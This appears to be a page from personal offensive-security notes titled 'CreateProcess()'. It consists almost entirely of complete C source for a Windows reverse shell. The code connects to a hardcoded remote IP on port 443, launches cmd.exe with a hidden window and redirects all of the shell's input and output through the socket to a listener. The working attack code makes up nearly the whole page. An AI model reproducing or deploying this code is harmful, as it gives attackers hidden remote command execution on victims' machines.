<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>CreateProcess</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># CreateProcess()</h1></strong><br /><strong>Examples</strong><br />â€¢ <a href="https://h0mbre.github.io/Win32_Reverse_Shellcode#c-prototype">https://h0mbre.github.io/Win32_Reverse_Shellcode#c-prototype</a><br /><br />This is arguably the nicer / cleaner / easier way of executing commands compared to <code>_popen()</code>.<br /><br />This is more of a real shell.<br />You can also run singular commands though.<br /><br />This method spawns a shell with <code>cmd.exe</code> process with <code>CreateProcessA()</code> and sets the <code>stdin</code> and <code>stdout</code> of the spawned process - <code>cmd.exe</code> - to be sent to the reverse shell socket. That way the listener can send and receive output from <code>cmd.exe</code> process.<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;WinSock2.h&gt;<br />#include&nbsp;&lt;WS2tcpip.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Ws2_32.lib&quot;)<br /><br />#define&nbsp;REMOTE_IP&nbsp;&quot;192.168.58.142&quot;<br />#define&nbsp;REMOTE_PORT&nbsp;443<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	//&nbsp;detach&nbsp;from&nbsp;calling&nbsp;process&nbsp;(probably&nbsp;cmd.exe,&nbsp;where&nbsp;this&nbsp;program&nbsp;was&nbsp;run&nbsp;from)<br />	//FreeConsole();<br /><br />	//&nbsp;initialise&nbsp;winsock<br />	printf(&quot;[*]&nbsp;initialisaing&nbsp;winsock&nbsp;\n&quot;);<br />	WSADATA&nbsp;wsaData;<br />	int&nbsp;ret&nbsp;=&nbsp;0;<br /><br />	ret&nbsp;=&nbsp;WSAStartup(MAKEWORD(2,&nbsp;2),&nbsp;&amp;wsaData);<br />	if&nbsp;(ret&nbsp;!=&nbsp;0)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;initialise&nbsp;winsock:&nbsp;%d&nbsp;\n&quot;,&nbsp;ret);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;set&nbsp;remote&nbsp;address&nbsp;info<br />	struct&nbsp;sockaddr_in&nbsp;remoteHost;<br />	ZeroMemory(&amp;remoteHost,&nbsp;sizeof(remoteHost));<br /><br />	ULONG&nbsp;remote_ip_binary;<br />	inet_pton(AF_INET,&nbsp;REMOTE_IP,&nbsp;&amp;remote_ip_binary);		//&nbsp;convert&nbsp;IP&nbsp;string&nbsp;into&nbsp;binary<br /><br />	remoteHost.sin_family&nbsp;=&nbsp;AF_INET;<br />	remoteHost.sin_addr.S_un.S_addr&nbsp;=&nbsp;remote_ip_binary;<br />	remoteHost.sin_port&nbsp;=&nbsp;htons(REMOTE_PORT);<br /><br />	//&nbsp;create&nbsp;socket<br />	printf(&quot;[*]&nbsp;creating&nbsp;socket&nbsp;\n&quot;);<br />	SOCKET&nbsp;muhSocket&nbsp;=&nbsp;INVALID_SOCKET;<br />	muhSocket&nbsp;=&nbsp;WSASocket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0,&nbsp;NULL,&nbsp;0,&nbsp;0);<br />	if&nbsp;(muhSocket&nbsp;==&nbsp;INVALID_SOCKET)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;create&nbsp;socket:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;connect&nbsp;to&nbsp;target<br />	printf(&quot;[*]&nbsp;connecting&nbsp;to&nbsp;%s:%d\n&quot;,&nbsp;REMOTE_IP,&nbsp;REMOTE_PORT);<br />	if&nbsp;(connect(muhSocket,&nbsp;(struct&nbsp;sockaddr*)&nbsp;&amp;&nbsp;remoteHost,&nbsp;sizeof(remoteHost))&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;connect:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;inform&nbsp;listener<br />	printf(&quot;[*]&nbsp;informing&nbsp;listener&nbsp;\n&quot;);<br />	char&nbsp;msg[]&nbsp;=&nbsp;&quot;[*]&nbsp;hey!&nbsp;:)&nbsp;spawning&nbsp;a&nbsp;shell...&nbsp;\n[*]&nbsp;to&nbsp;quit&nbsp;cleanly,&nbsp;pls&nbsp;use&nbsp;&#39;exit&#39;&nbsp;\n&quot;;<br />	if&nbsp;(send(muhSocket,&nbsp;msg,&nbsp;strlen(msg),&nbsp;0)&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;send&nbsp;data:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;create&nbsp;process<br />	STARTUPINFOA&nbsp;startupInfo;<br />	PROCESS_INFORMATION&nbsp;processInfo;<br /><br />	ZeroMemory(&amp;startupInfo,&nbsp;sizeof(startupInfo));<br />	ZeroMemory(&amp;processInfo,&nbsp;sizeof(processInfo));<br /><br />	startupInfo.cb&nbsp;=&nbsp;sizeof(startupInfo);<br />	startupInfo.dwFlags&nbsp;=&nbsp;STARTF_USESTDHANDLES&nbsp;|&nbsp;STARTF_USESHOWWINDOW;<br />	startupInfo.wShowWindow&nbsp;=&nbsp;SW_HIDE;				//&nbsp;hide&nbsp;window&nbsp;of&nbsp;spawned&nbsp;process&nbsp;from&nbsp;showing&nbsp;up<br />	startupInfo.hStdInput&nbsp;=&nbsp;(HANDLE)muhSocket;		//&nbsp;set&nbsp;stdin,&nbsp;stdout,&nbsp;and&nbsp;stderr&nbsp;to&nbsp;be&nbsp;sent&nbsp;to&nbsp;the&nbsp;connected&nbsp;socket<br />	startupInfo.hStdOutput&nbsp;=&nbsp;(HANDLE)muhSocket;<br />	startupInfo.hStdError&nbsp;=&nbsp;(HANDLE)muhSocket;<br /><br />	char&nbsp;process[]&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\cmd.exe&quot;;		//&nbsp;spawn&nbsp;shell<br />	//&nbsp;char&nbsp;process[]&nbsp;=&nbsp;&quot;whoami&quot;;							//&nbsp;run&nbsp;single&nbsp;command<br />	printf(&quot;[*]&nbsp;running&nbsp;%s&nbsp;\n&quot;,&nbsp;process);<br />	if&nbsp;(CreateProcessA(NULL,&nbsp;process,&nbsp;NULL,&nbsp;NULL,&nbsp;TRUE,&nbsp;0,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;startupInfo,&nbsp;&amp;processInfo)&nbsp;==&nbsp;0)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;create&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	WaitForSingleObject(processInfo.hProcess,&nbsp;INFINITE);	//&nbsp;uncomment&nbsp;for&nbsp;this&nbsp;.exe&nbsp;to&nbsp;run/pause&nbsp;until&nbsp;listener&nbsp;exits&nbsp;shell/command&nbsp;finishes&nbsp;running<br /><br />	//&nbsp;clean&nbsp;up&nbsp;&amp;&nbsp;exit<br />	printf(&quot;[*]&nbsp;exiting&nbsp;\n&quot;);<br />	//&nbsp;close&nbsp;spawned&nbsp;process<br />	CloseHandle(processInfo.hProcess);<br />	CloseHandle(processInfo.hThread);<br />	//&nbsp;close&nbsp;socket&nbsp;connection<br />	closesocket(muhSocket);<br />	WSACleanup();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
